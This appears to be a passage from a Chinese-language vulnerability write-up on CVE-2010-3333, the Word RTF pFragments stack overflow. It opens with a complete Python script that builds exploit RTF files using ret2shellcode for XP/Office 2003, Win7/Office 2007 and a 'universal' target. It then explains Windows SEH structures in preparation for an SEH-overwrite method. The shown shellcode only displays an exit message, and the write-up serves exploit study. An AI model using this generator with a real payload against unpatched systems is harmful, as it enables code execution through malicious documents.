<p><strong><code>Exp:</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Sp4n9x</span></span><br><span class="line"><span class="comment"># Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow(CVE-2010-3333)</span></span><br><span class="line"><span class="comment"># Environment1: Windows XP SP3 &amp; Microsoft Office 2003 SP3(11.8169.8172)</span></span><br><span class="line"><span class="comment"># Environment2: Windows 7 x86 SP0 &amp; Microsoft Office 2007 SP0(12.0.4518.1014)</span></span><br><span class="line"><span class="comment"># Exploit Technology: ret2shellcode</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_array_paramter</span><span class="params">()</span>:</span></span><br><span class="line">    bad_sizes = (<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">    num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">while</span> num <span class="keyword">in</span> bad_sizes:</span><br><span class="line">        num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(env)</span>:</span></span><br><span class="line">    el_size = generate_array_paramter() <span class="comment"># Array element size</span></span><br><span class="line">    el_count = generate_array_paramter() <span class="comment"># Array element count</span></span><br><span class="line"></span><br><span class="line">    str1 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x1111</span>)</span><br><span class="line">    str1 = binascii.b2a_hex(str1)</span><br><span class="line">    str2 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x2222</span>)</span><br><span class="line">    str2 = binascii.b2a_hex(str2)</span><br><span class="line">    data = str1 + str2</span><br><span class="line">    </span><br><span class="line">    length = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x0130</span>) <span class="comment"># the data length after this</span></span><br><span class="line">    length =  binascii.b2a_hex(length) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7dc54e64</span>) <span class="comment"># shell32.dll(version: 6.0.2900.6242),PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x788281cb</span>) <span class="comment"># msxml5.dll(version: 5.20.1072.0),ASLR Disable,PAGE_EXECUTE_READ(OllyFindAddr,mona)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7ffa4512</span>) <span class="comment"># no module,universal,PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line"></span><br><span class="line">    shellcode = (<span class="string">"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"</span></span><br><span class="line">                 <span class="string">"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"</span></span><br><span class="line">                 <span class="string">"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"</span></span><br><span class="line">                 <span class="string">"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"</span></span><br><span class="line">                 <span class="string">"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"</span></span><br><span class="line">                 <span class="string">"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6e\x39"</span></span><br><span class="line">                 <span class="string">"\x78\x01\x68\x40\x53\x70\x34\x89\xe1\xfe\x49\x07\x31\xc0\x51"</span></span><br><span class="line">                 <span class="string">"\x50\xff\xd7"</span>) <span class="comment"># FatalAppExitA(uAction=0,lpMessageText="@Sp4n9x\x01")</span></span><br><span class="line">    shellcode = binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line">    pFragments_value = <span class="string">"%d;%d;"</span> % (el_size,el_count)</span><br><span class="line">    pFragments_value += data</span><br><span class="line">    pFragments_value += length</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x14</span>*<span class="number">2</span></span><br><span class="line">    pFragments_value += jmp_esp</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x10</span>*<span class="number">2</span></span><br><span class="line">    <span class="comment"># The fifth parameter of sub_30F0B5C2(Office2003)/sub_32E5955E(Office2007) on the stack</span></span><br><span class="line">    pFragments_value += <span class="string">'0'</span>*<span class="number">8</span> <span class="comment"># make "30F0B7B8 cmp [ebp+arg_8], ebx" equal(Office2003).</span></span><br><span class="line">    pFragments_value += shellcode</span><br><span class="line"></span><br><span class="line">    content = <span class="string">r"&#123;\rtf1"</span></span><br><span class="line">    content += <span class="string">r"&#123;\shp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sn pfragments&#125;"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sv %s"</span> % pFragments_value</span><br><span class="line">    content += <span class="string">r"&#125;&#125;&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> len(content)</span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(XP_Office2003).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(Win7_Office2007).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)        </span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode-universal.rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 0:XP&amp;Office2003</span></span><br><span class="line">    <span class="comment"># 1:Win7&amp;Office2007</span></span><br><span class="line">    <span class="comment"># 2:universal</span></span><br><span class="line">    env = <span class="number">2</span></span><br><span class="line">    exploit(env)</span><br></pre></td></tr></table></figure></p>
<h3 id="0x42-方法二：覆盖SEH记录"><a href="#0x42-方法二：覆盖SEH记录" class="headerlink" title="0x42 方法二：覆盖SEH记录"></a>0x42 方法二：覆盖SEH记录</h3><h4 id="1、用户态的异常处理过程"><a href="#1、用户态的异常处理过程" class="headerlink" title="1、用户态的异常处理过程"></a>1、用户态的异常处理过程</h4><p>&emsp;&emsp;本程序产生的异常属于<code>用户态的异常</code>。</p>
<p><strong><code>用户态的异常处理过程:</code></strong></p>
<blockquote>
<ul>
<li>1、如果<code>发生异常</code>的程序正在<code>被调试</code>，那么将<code>异常信息</code>发送给正在调试它的<code>用户态调试器</code>，给调试器<code>第1次处理机会</code>；如果没有<code>被调试</code>，跳过本步。</li>
<li>2、如果<code>不存在</code>用户态调试器或调试器<code>未处理该异常</code>，那么在栈上放置<code>EXCEPTION_RECORD</code>和<code>CONTEXT</code>两个结构以及记录这两个结构位置的<code>EXCEPTION_POINTERS</code>结构，并将控制权返回给用户态<code>ntdll.dll</code>中的<code>KiUserExceptionDispatcher</code>函数，由它调用<code>ntdll!RtlDispatchException</code>函数进行<code>用户态的异常处理</code>。</li>
<li>3、如果<code>ntdll!RtlDispatchException</code>函数在调用用户态的异常处理过程中<code>未能处理该异常</code>，那么异常处理过程会再次返回<code>nt!KiDispatchException</code>，它将再次把<code>异常信息</code>发送给<code>用户态的调试器</code>，给调试器<code>第2次处理机会</code>。如果<code>没有</code>调试器存在，则<code>不会</code>进行第2次分发，而是直接<code>结束进程</code>。</li>
<li>4、如果第2次机会调试器<code>仍不处理</code>，<code>nt!KiDispatchException</code>会再次尝试把<code>异常</code>分发给<code>进程的异常端口</code>进行处理。该端口通常由<code>子系统进程csrss.exe</code>进行监听。子系统监听到该错误后，通常会显示一个<code>“应用程序错误”</code>对话框，用户可以单击<code>“确定”</code>按钮或者最后将其附加到调试器上的<code>“取消”</code>按钮。如果<code>没有调试器</code>能附加于其上，或者调试器还是<code>处理不了异常</code>，系统就调用<code>ExitProcess</code>函数来终结程序。</li>
<li>5、在<code>终结程序</code>之前，系统会再次调用<code>发生异常的线程</code>中的<code>所有异常处理过程</code>，这是线程异常处理过程所获得的<code>清理未释放资源</code>的最后机会，此后程序就终结了。</li>
</ul>
</blockquote>
<h4 id="2、SEH相关数据结构"><a href="#2、SEH相关数据结构" class="headerlink" title="2、SEH相关数据结构"></a>2、SEH相关数据结构</h4><h5 id="2-1、TIB结构"><a href="#2-1、TIB结构" class="headerlink" title="2.1、TIB结构"></a>2.1、TIB结构</h5><p>&emsp;&emsp;<code>TIB</code>(Thread Information Block,线程信息块)是保存<code>线程基本信息</code>的数据结构。在<code>用户模式</code>下，它位于<code>TEB</code>(Thread Environment Block,线程环境块)的<code>头部</code>，而<code>TEB</code>是操作系统为了保存<code>每个线程的私有数据</code>创建的，每个线程都有自己的TEB。在<code>Windows 2000 DDK</code>中(<code>winnt.h</code>)，TIB的定义如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">// 指向异常处理链表</span></span><br><span class="line">    PVOID StackBase;            <span class="comment">// 当前线程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;           <span class="comment">// 当前线程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span> <span class="comment">// 指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;虽然<code>Windows</code>系统经历了多次<code>更新换代</code>，但是从<code>Windows 2000</code>到<code>Windows 10</code>，<code>TIB</code>的结构变化很小。其中，与异常处理相关的项是指向<code>EXCEPTION_REGISTRATION_RECORD</code>结构的<code>指针ExceptionList</code>，它位于<code>TIB</code>的<code>偏移0处</code>，同时在<code>TEB</code>的<code>偏移0处</code>。在<code>x86平台</code>的<code>用户模式</code>下，Windows将<code>FS段选择器</code>指向<code>当前线程的TEB数据</code>，即<code>TEB</code>总是由<code>fs:[0]</code>指向的(在<code>x64平台</code>上，这个关系变成了<code>gs:[0]</code>)。</p>
<h5 id="2-2、-EXCEPTION-REGISTRATION-RECORD结构"><a href="#2-2、-EXCEPTION-REGISTRATION-RECORD结构" class="headerlink" title="2.2、_EXCEPTION_REGISTRATION_RECORD结构"></a>2.2、_EXCEPTION_REGISTRATION_RECORD结构</h5><p>&emsp;&emsp;TEB(或TIB)偏移量为0的_EXCEPTION_REGISTRATION_RECORD主要是用于描述线程异常处理过程的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系，其定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span>    <span class="comment">// 指向下一个_EXCEPTION_REGISTRATION_RECORD结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;                     <span class="comment">// 当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中，<code>“Next”</code>是指向下一个<code>_EXCEPTION_REGISTRATION_RECORD</code>结构(简称:<code>“ERR”</code>)的指针,形成一<code>链状结构</code>，而<code>链表头</code>就存放在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中；<code>“Handler”</code>指向<code>异常处理回调函数</code>。当程序运行过程中产生异常时，系统的<code>异常分发器</code>就会从<code>fs:[0]</code>处取得<code>异常处理的链表头</code>，然后查找<code>异常处理链表</code>并依次调用<code>各个链表节点</code>中的<code>异常处理回调函数</code>。由于<code>TEB</code>是线程的<code>私有数据结构</code>，相应的，<code>每个线程</code>也都有自己的<code>异常处理链表</code>，即<code>SEH机制</code>的<code>作用范围</code>仅限于<code>当前线程</code>。从<code>数据结构</code>的角度来讲，<code>SEH链</code>就是一个只允许在<code>链表头部</code>进行<code>增加</code>和<code>删除</code>节点操作的<code>单向链表</code>，且<code>链表头部</code>永远保存在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中。</p>
<p>&emsp;&emsp;下图就是<code>SEH异常处理链表</code>的示意图：<br><img src="/resources/2020/CVE-2010-3333/SEH异常处理链表示意图.png" alt="SEH异常处理链表示意图"></p>
<h5 id="2-3、-EXCEPTION-RECORD结构"><a href="#2-3、-EXCEPTION-RECORD结构" class="headerlink" title="2.3、_EXCEPTION_RECORD结构"></a>2.3、_EXCEPTION_RECORD结构</h5><p>&emsp;&emsp;各个<code>异常处理函数</code>除了针对<code>本异常的特定处理</code>之外，通常会将<code>异常信息</code>进行封装，以便进行后续处理。<code>封装异常信息</code>的结构就是<code>_EXCEPTION_RECORD</code>，该结构定义如下(<code>winnt.h</code>)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;                         <span class="comment">// 异常代码</span></span><br><span class="line">    DWORD ExceptionFlags;                           <span class="comment">// 异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span>      <span class="comment">// 指向另一个EXCEPTION_RECORD的指针</span></span><br><span class="line">    PVOID ExceptionAddress;                         <span class="comment">// 异常发生的地址</span></span><br><span class="line">    DWORD NumberParameters;                         <span class="comment">// 下面的ExceptionInformation含有的元素数目</span></span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];   <span class="comment">// 附加信息</span></span><br><span class="line">    &#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<p><strong><code>常见的异常产生原因：</code></strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">异常产生原因</th>
<th style="text-align:center">对应值</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">STATUS_GUARD_PAGE_VIOLATION</td>
<td style="text-align:center">080000001h</td>
<td style="text-align:left">读写属性为PAGE_GUARD的页面</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_BREAKPOINT</td>
<td style="text-align:center">080000003h</td>
<td style="text-align:left">断点异常</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_SINGLE_STEP</td>
<td style="text-align:center">080000004h</td>
<td style="text-align:left">单步中断</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_INVALID_HANDLE</td>
<td style="text-align:center">0C0000008h</td>
<td style="text-align:left">向一个函数传递了一个无效句柄</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_INVALID_VIOLATION</td>
<td style="text-align:center">0C0000005h</td>
<td style="text-align:left">读写内存违规</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_ILLEGAL_INSTRUCTION</td>
<td style="text-align:center">0C000001Dh</td>
<td style="text-align:left">遇到无效指令</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_IN_PAGE_ERROR</td>
<td style="text-align:center">0C0000006h</td>
<td style="text-align:left">存取不存在的页面</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_INT_DIVIDE_BY_ZERO</td>
<td style="text-align:center">0C0000094h</td>
<td style="text-align:left">除0错误</td>
</tr>
<tr>
<td style="text-align:left">EXCEPTION_STACK_OVERFLOW</td>
<td style="text-align:center">0C00000FDh</td>
<td style="text-align:left">栈溢出</td>
</tr>
</tbody>
</table>
<h5 id="2-4、-CONTEXT结构"><a href="#2-4、-CONTEXT结构" class="headerlink" title="2.4、_CONTEXT结构"></a>2.4、_CONTEXT结构</h5><p>&emsp;&emsp;<code>异常处理函数</code>除了将一部分异常信息封装成<code>_EXCEPTION_RECORD</code>，还将另一部分异常信息封装成<code>陷阱帧</code>，它精确描述了发生异常时<code>线程的状态</code>(Windows的<code>任务调度</code>是基于<code>线程</code>的)。该结构与<code>处理器</code>高度相关，因此在不同的平台上(<code>Intel x86/x64</code>、<code>MIPS</code>、<code>Alpha</code>和<code>PowerPC</code>处理器等)有不同的定义。其结构中包含<code>每个寄存器的状态</code>，但该结构一般仅供<code>系统内核自身</code>或者<code>调试系统</code>使用。当需要把控制权交给<code>用户注册</code>的<code>异常处理程序</code>时，会将<code>上述结构</code>转换成一个名为<code>CONTEXT的结构</code>，它包含线程运行时处理器<code>各主要寄存器的完整镜像</code>，用于保存<code>线程运行环境</code>。</p>
<p>&emsp;&emsp;<code>x86平台</code>上的<code>CONTEXT结构</code>如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line">    <span class="comment">// 标志位，表示整个结构中哪些部分是有效的</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_DEBUG_REGISTERS时，以下部分有效</span></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_FLOATING_POINT时，以下部分有效</span></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_SEGMENTS时，以下部分有效</span></span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_INTEGER时，以下部分有效</span></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_CONTROL时，以下部分有效</span></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_EXTENDED_REGISTERS时，以下部分有效</span></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;该结构的大部分是<code>不言自明</code>的。需要解释的是，其第一个域<code>ContextFlags</code>表示该结构中<code>哪些域有效</code>，当需要<code>CONTEXT结构</code>保存的信息<code>恢复执行</code>时可对应更新，这为<code>有选择的更新部分域</code>而非全部域提供了有效的手段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i386    0x00010000L    <span class="comment">// 这假设i386和i486具有相同的上下文记录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i486    0x00010000L    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_CONTROL             (CONTEXT_i386 | 0x00000001L) <span class="comment">// 控制寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_INTEGER             (CONTEXT_i386 | 0x00000002L) <span class="comment">// (整数)通用寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_SEGMENTS            (CONTEXT_i386 | 0x00000004L) <span class="comment">// 段寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_FLOATING_POINT      (CONTEXT_i386 | 0x00000008L) <span class="comment">// 浮点寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_DEBUG_REGISTERS     (CONTEXT_i386 | 0x00000010L) <span class="comment">// 调试寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_EXTENDED_REGISTERS  (CONTEXT_i386 | 0x00000020L) <span class="comment">// 扩展寄存器</span></span></span><br></pre></td></tr></table></figure>
<h5 id="2-5、-EXCEPTION-POINTERS结构"><a href="#2-5、-EXCEPTION-POINTERS结构" class="headerlink" title="2.5、_EXCEPTION_POINTERS结构"></a>2.5、_EXCEPTION_POINTERS结构</h5><p>&emsp;&emsp;当一个<code>异常</code>发生时，在没有<code>调试器</code>干预的情况下，操作系统会将<code>异常信息</code>转交给<code>用户态的异常处理过程</code>。实际上，由于<code>同一个线程</code>在<code>用户态</code>和<code>内核态</code>使用的是<code>两个不同的栈</code>，为了让<code>用户态的异常处理程序</code>能够访问<code>与异常相关的数据</code>，操作系统必须把与<code>本次异常</code>相关联的<code>_EXCEPTION_RECORD结构</code>和<code>_CONTEXT结构</code>放到<code>用户栈</code>中，同时在栈上放置一个<code>_EXCEPTION_POINTERS结构</code>，它包含<code>两个指针</code>，一个指向<code>_EXCEPTION_RECORD结构</code>，另一个指向<code>_CONTEXT结构</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_POINTERS</span> &#123;</span></span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;            <span class="comment">// _EXCEPTION_RECORD结构指针</span></span><br><span class="line">  PCONTEXT          ContextRecord;              <span class="comment">// _CONTEXT结构指针</span></span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure>
<h4 id="3、计算偏移量"><a href="#3、计算偏移量" class="headerlink" title="3、计算偏移量"></a>3、计算偏移量</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p>
<p>&emsp;&emsp;既然我们要覆盖<code>SEH记录</code>，就要搞清楚，<code>覆盖</code>栈数据之前，栈上有<code>哪些SEH记录</code>，以及<code>它们的位置</code>。在复制<code>pFragments属性数据</code>到栈上之前，栈上的<code>SEH记录</code>如下(CVE-2010-3333(target6,Crash).rtf)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 0012FFE0 |--+ 指向下一个SEH记录的指针</span><br><span class="line">                       +----------+  | </span><br><span class="line">            0x0012FFB4 | 30AA1ABC |  | SE处理程序</span><br><span class="line">                       +----------+  |</span><br><span class="line">                       |          |  |</span><br><span class="line">               ......  |  ......  |  |</span><br><span class="line">                       |          |  |</span><br><span class="line">                       +----------+  |</span><br><span class="line">            0x0012FFE0 | FFFFFFFF |&lt;-+ SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 7C839AB0 |    SE处理程序</span><br><span class="line">                       +----------+</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Office v11.8307.8324, winword.exe 